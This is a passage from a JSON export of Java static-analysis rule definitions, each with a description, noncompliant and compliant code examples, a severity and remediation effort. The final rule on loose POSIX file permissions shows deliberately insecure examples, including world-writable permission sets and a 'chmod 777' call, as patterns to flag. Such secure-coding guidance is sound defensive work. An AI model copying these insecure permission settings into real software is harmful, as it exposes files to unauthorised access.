            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2973",
            "repo": "java",
            "name": "Escaped Unicode characters should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc":"<p>The use of Unicode escape sequences should be reserved for characters that would otherwise be ambiguous, such as unprintable characters.</p>\n<p>This rule ignores sequences composed entirely of Unicode characters, but otherwise raises an issue for each Unicode character that represents a\nprintable character.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString prefix = \"n\ée\"; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString prefix = \"née\";\n</pre>",
            "mdDesc":"<p>The use of Unicode escape sequences should be reserved for characters that would otherwise be ambiguous, such as unprintable characters.</p>\n<p>This rule ignores sequences composed entirely of Unicode characters, but otherwise raises an issue for each Unicode character that represents a\nprintable character.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString prefix = \"n\ée\"; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString prefix = \"née\";\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2974",
            "repo": "java",
            "name": "Classes without \"public\" constructors should be \"final\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Classes with only <code>private</code> constructors should be marked <code>final</code> to prevent any mistaken extension attempts.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class PrivateConstructorClass {  // Noncompliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic final class PrivateConstructorClass {  // Compliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>",
            "mdDesc": "<p>Classes with only <code>private</code> constructors should be marked <code>final</code> to prevent any mistaken extension attempts.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class PrivateConstructorClass {  // Noncompliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic final class PrivateConstructorClass {  // Compliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1641",
            "repo": "java",
            "name": "Sets with elements that are enum values should be replaced with EnumSet",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When all the elements in a Set are values from the same enum, the Set can be replaced with an EnumSet, which can be much more efficient than other\nsets because the underlying data structure is a simple bitmap.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    Set&lt;COLOR&gt; warm = new HashSet&lt;COLOR&gt;();\n    warm.add(COLOR.RED);\n    warm.add(COLOR.ORANGE);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    Set&lt;COLOR&gt; warm = EnumSet.of(COLOR.RED, COLOR.ORANGE);\n  }\n}\n</pre>",
            "mdDesc": "<p>When all the elements in a Set are values from the same enum, the Set can be replaced with an EnumSet, which can be much more efficient than other\nsets because the underlying data structure is a simple bitmap.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    Set&lt;COLOR&gt; warm = new HashSet&lt;COLOR&gt;();\n    warm.add(COLOR.RED);\n    warm.add(COLOR.ORANGE);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    Set&lt;COLOR&gt; warm = EnumSet.of(COLOR.RED, COLOR.ORANGE);\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2972",
            "repo": "java",
            "name": "Inner classes should not have too many lines of code",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Inner classes should be short and sweet, to manage complexity in the overall file. An inner class that has grown longer than a certain threshold\nshould probably be externalized to its own file.</p>",
            "mdDesc": "<p>Inner classes should be short and sweet, to manage complexity in the overall file. An inner class that has grown longer than a certain threshold\nshould probably be externalized to its own file.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "Max",
                    "htmlDesc": "The maximum number of lines allowed",
                    "defaultValue": "25",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1640",
            "repo": "java",
            "name": "Maps with keys that are enum values should be replaced with EnumMap",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>, which can be much more\nefficient than other sets because the underlying data structure is a simple array.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void mapMood() {\n    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void mapMood() {\n    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;&gt; (COLOR.class);\n  }\n}\n</pre>",
            "mdDesc": "<p>When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>, which can be much more\nefficient than other sets because the underlying data structure is a simple array.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void mapMood() {\n    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void mapMood() {\n    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;&gt; (COLOR.class);\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2970",
            "repo": "java",
            "name": "Assertions should be complete",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It is very easy to write incomplete assertions when using some test frameworks. This rule enforces complete assertions in the following cases:</p>\n<ul>\n  <li> Fest: <code>assertThat</code> is not followed by an assertion invocation </li>\n  <li> AssertJ: <code>assertThat</code> is not followed by an assertion invocation </li>\n  <li> Mockito: <code>verify</code> is not followed by a method invocation </li>\n  <li> Truth: <code>assertXXX</code> is not followed by an assertion invocation </li>\n</ul>\n<p>In such cases, what is intended to be a test doesn't actually verify anything</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result); // Noncompliant; nothing is actually checked, the test passes whether \"result\" is true or false\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add(\"one\");\nmockedList.clear();\n// let's check that \"add\" and \"clear\" methods are actually called\nMockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result).isTrue();\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add(\"one\");\nmockedList.clear();\n// let's check that \"add\" and \"clear\" methods are actually called\nMockito.verify(mockedList).add(\"one\");\nMockito.verify(mockedList).clear();\n</pre>\n<h2>Exceptions</h2>\n<p>Variable assignments and return statements are skipped to allow helper methods.</p>\n<pre>\nprivate BooleanAssert check(String filename, String key) {\n  String fileContent = readFileContent(filename);\n  performReplacements(fileContent);\n  return assertThat(fileContent.contains(key)); // No issue is raised here\n}\n\n@Test\npublic void test() {\n  check(\"foo.txt\", \"key1\").isTrue();\n  check(\"bar.txt\", \"key2\").isTrue();\n}\n</pre>",
            "mdDesc": "<p>It is very easy to write incomplete assertions when using some test frameworks. This rule enforces complete assertions in the following cases:</p>\n<ul>\n  <li> Fest: <code>assertThat</code> is not followed by an assertion invocation </li>\n  <li> AssertJ: <code>assertThat</code> is not followed by an assertion invocation </li>\n  <li> Mockito: <code>verify</code> is not followed by a method invocation </li>\n  <li> Truth: <code>assertXXX</code> is not followed by an assertion invocation </li>\n</ul>\n<p>In such cases, what is intended to be a test doesn't actually verify anything</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result); // Noncompliant; nothing is actually checked, the test passes whether \"result\" is true or false\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add(\"one\");\nmockedList.clear();\n// let's check that \"add\" and \"clear\" methods are actually called\nMockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result).isTrue();\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add(\"one\");\nmockedList.clear();\n// let's check that \"add\" and \"clear\" methods are actually called\nMockito.verify(mockedList).add(\"one\");\nMockito.verify(mockedList).clear();\n</pre>\n<h2>Exceptions</h2>\n<p>Variable assignments and return statements are skipped to allow helper methods.</p>\n<pre>\nprivate BooleanAssert check(String filename, String key) {\n  String fileContent = readFileContent(filename);\n  performReplacements(fileContent);\n  return assertThat(fileContent.contains(key)); // No issue is raised here\n}\n\n@Test\npublic void test() {\n  check(\"foo.txt\", \"key1\").isTrue();\n  check(\"bar.txt\", \"key2\").isTrue();\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2737",
            "repo": "java",
            "name": "\"catch\" clauses should do more than rethrow",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting\nit bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>\n<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String readFile(File f) {\n  StringBuilder sb = new StringBuilder();\n  try {\n    FileReader fileReader = new FileReader(fileName);\n    BufferedReader bufferedReader = new BufferedReader(fileReader);\n\n    while((line = bufferedReader.readLine()) != null) {\n      //...\n  }\n  catch (IOException e) {  // Noncompliant\n    throw e;\n  }\n  return sb.toString();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String readFile(File f) {\n  StringBuilder sb = new StringBuilder();\n  try {\n    FileReader fileReader = new FileReader(fileName);\n    BufferedReader bufferedReader = new BufferedReader(fileReader);\n\n    while((line = bufferedReader.readLine()) != null) {\n      //...\n  }\n  catch (IOException e) {\n    logger.LogError(e);\n    throw e;\n  }\n  return sb.toString();\n}\n</pre>\n<p>or</p>\n<pre>\npublic String readFile(File f) throws IOException {\n  StringBuilder sb = new StringBuilder();\n  FileReader fileReader = new FileReader(fileName);\n  BufferedReader bufferedReader = new BufferedReader(fileReader);\n\n  while((line = bufferedReader.readLine()) != null) {\n    //...\n\n  return sb.toString();\n}\n</pre>",
            "mdDesc": "<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting\nit bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>\n<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String readFile(File f) {\n  StringBuilder sb = new StringBuilder();\n  try {\n    FileReader fileReader = new FileReader(fileName);\n    BufferedReader bufferedReader = new BufferedReader(fileReader);\n\n    while((line = bufferedReader.readLine()) != null) {\n      //...\n  }\n  catch (IOException e) {  // Noncompliant\n    throw e;\n  }\n  return sb.toString();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String readFile(File f) {\n  StringBuilder sb = new StringBuilder();\n  try {\n    FileReader fileReader = new FileReader(fileName);\n    BufferedReader bufferedReader = new BufferedReader(fileReader);\n\n    while((line = bufferedReader.readLine()) != null) {\n      //...\n  }\n  catch (IOException e) {\n    logger.LogError(e);\n    throw e;\n  }\n  return sb.toString();\n}\n</pre>\n<p>or</p>\n<pre>\npublic String readFile(File f) throws IOException {\n  StringBuilder sb = new StringBuilder();\n  FileReader fileReader = new FileReader(fileName);\n  BufferedReader bufferedReader = new BufferedReader(fileReader);\n\n  while((line = bufferedReader.readLine()) != null) {\n    //...\n\n  return sb.toString();\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "error-handling",
                "finding",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3824",
            "repo": "java",
            "name": "\"Map.get\" and value test should be replaced with single method call",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It's a common pattern to test the result of a <code>java.util.Map.get()</code> against <code>null</code> or calling\n<code>java.util.Map.containsKey()</code> before proceeding with adding or changing the value in the map. However the <code>java.util.Map</code> API\noffers a significantly better alternative in the form of the <code>computeIfPresent()</code> and <code>computeIfAbsent()</code> methods. Using these\ninstead leads to cleaner and more readable code.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is not 8.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nV value = map.get(key);\nif (value == null) {  // Noncompliant\n  value = V.createFor(key);\n  if (value != null) {\n    map.put(key, value);\n  }\n}\nif (!map.containsKey(key)) {  // Noncompliant\n  value = V.createFor(key);\n  if (value != null) {\n    map.put(key, value);\n  }\n}\nreturn value;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nreturn map.computeIfAbsent(key, k -&gt; V.createFor(k));\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue when trying to add <code>null</code> to a map, because <code>computeIfAbsent</code> will not add the entry if the\nvalue returned by the function is <code>null</code>.</p>\n<h2>See also</h2>\n<ul>\n  <li> <a href='/coding_rules#rule_key=java%3AS6104'>S6104</a> - Map \"computeIfAbsent()\" and \"computeIfPresent()\" should not be used to add \"null\" values. </li>\n</ul>",
            "mdDesc": "<p>It's a common pattern to test the result of a <code>java.util.Map.get()</code> against <code>null</code> or calling\n<code>java.util.Map.containsKey()</code> before proceeding with adding or changing the value in the map. However the <code>java.util.Map</code> API\noffers a significantly better alternative in the form of the <code>computeIfPresent()</code> and <code>computeIfAbsent()</code> methods. Using these\ninstead leads to cleaner and more readable code.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is not 8.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nV value = map.get(key);\nif (value == null) {  // Noncompliant\n  value = V.createFor(key);\n  if (value != null) {\n    map.put(key, value);\n  }\n}\nif (!map.containsKey(key)) {  // Noncompliant\n  value = V.createFor(key);\n  if (value != null) {\n    map.put(key, value);\n  }\n}\nreturn value;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nreturn map.computeIfAbsent(key, k -&gt; V.createFor(k));\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue when trying to add <code>null</code> to a map, because <code>computeIfAbsent</code> will not add the entry if the\nvalue returned by the function is <code>null</code>.</p>\n<h2>See also</h2>\n<ul>\n  <li> {rule:java:S6104} - Map \"computeIfAbsent()\" and \"computeIfPresent()\" should not be used to add \"null\" values. </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3822",
            "repo": "java",
            "name": "Hibernate should not update database schemas",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of any value but <code>\"validate\"</code> for <code>hibernate.hbm2ddl.auto</code> may cause the database schema used by your application to\nbe changed, dropped, or cleaned of all data. In short, the use of this property is risky, and should only be used in production with the\n<code>\"validate\"</code> option, if it is used at all.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;session-factory&gt;\n  &lt;property name=\"hibernate.hbm2ddl.auto\"&gt;update&lt;/property&gt;  &lt;!-- Noncompliant --&gt;\n&lt;/session-factory&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;session-factory&gt;\n  &lt;property name=\"hibernate.hbm2ddl.auto\"&gt;validate&lt;/property&gt;  &lt;!-- Compliant --&gt;\n&lt;/session-factory&gt;\n</pre>\n<p>or</p>\n<pre>\n&lt;session-factory&gt;\n  &lt;!-- Property deleted --&gt;\n&lt;/session-factory&gt;\n</pre>",
            "mdDesc": "<p>The use of any value but <code>\"validate\"</code> for <code>hibernate.hbm2ddl.auto</code> may cause the database schema used by your application to\nbe changed, dropped, or cleaned of all data. In short, the use of this property is risky, and should only be used in production with the\n<code>\"validate\"</code> option, if it is used at all.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;session-factory&gt;\n  &lt;property name=\"hibernate.hbm2ddl.auto\"&gt;update&lt;/property&gt;  &lt;!-- Noncompliant --&gt;\n&lt;/session-factory&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;session-factory&gt;\n  &lt;property name=\"hibernate.hbm2ddl.auto\"&gt;validate&lt;/property&gt;  &lt;!-- Compliant --&gt;\n&lt;/session-factory&gt;\n</pre>\n<p>or</p>\n<pre>\n&lt;session-factory&gt;\n  &lt;!-- Property deleted --&gt;\n&lt;/session-factory&gt;\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "hibernate",
                "sql"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2612",
            "repo": "java",
            "name": "Setting loose POSIX file permissions is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In Unix, \"<code>others</code>\" class refers to all users except the owner of the file and the members of the group assigned to this file.</p>\n<p>Granting permissions to this group can lead to unintended access to files. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n    public void setPermissions(String filePath) {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions\n        perms.add(PosixFilePermission.OTHERS_READ); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<pre>\n    public void setPermissionsUsingRuntimeExec(String filePath) {\n        Runtime.getRuntime().exec(\"chmod 777 file.json\"); // Sensitive\n    }\n</pre>\n<pre>\n    public void setOthersPermissionsHardCoded(String filePath ) {\n        Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString(\"rwxrwxrwx\")); // Sensitive\n    }\n</pre>\n<h2>Compliant Solution</h2>\n<p>On operating systems that implement POSIX standard. This will throw a <code>UnsupportedOperationException</code> on Windows.</p>\n<pre>\n    public void setPermissionsSafe(String filePath) throws IOException {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions removed\n        perms.remove(PosixFilePermission.OTHERS_READ); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_EXECUTE); // Compliant\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Test_File_Permission_(OTG-CONFIG-009)\">OWASP File Permission</a> </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/732\">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/266.html\">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions\">CERT, FIO01-J.</a> -\n  Create files with appropriate access permissions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions\">CERT, FIO06-C.</a> - Create\n  files with appropriate access permissions </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "mdDesc": "<p>In Unix, \"<code>others</code>\" class refers to all users except the owner of the file and the members of the group assigned to this file.</p>\n<p>Granting permissions to this group can lead to unintended access to files. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n    public void setPermissions(String filePath) {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions\n        perms.add(PosixFilePermission.OTHERS_READ); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<pre>\n    public void setPermissionsUsingRuntimeExec(String filePath) {\n        Runtime.getRuntime().exec(\"chmod 777 file.json\"); // Sensitive\n    }\n</pre>\n<pre>\n    public void setOthersPermissionsHardCoded(String filePath ) {\n        Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString(\"rwxrwxrwx\")); // Sensitive\n    }\n</pre>\n<h2>Compliant Solution</h2>\n<p>On operating systems that implement POSIX standard. This will throw a <code>UnsupportedOperationException</code> on Windows.</p>\n<pre>\n    public void setPermissionsSafe(String filePath) throws IOException {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions removed\n        perms.remove(PosixFilePermission.OTHERS_READ); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_EXECUTE); // 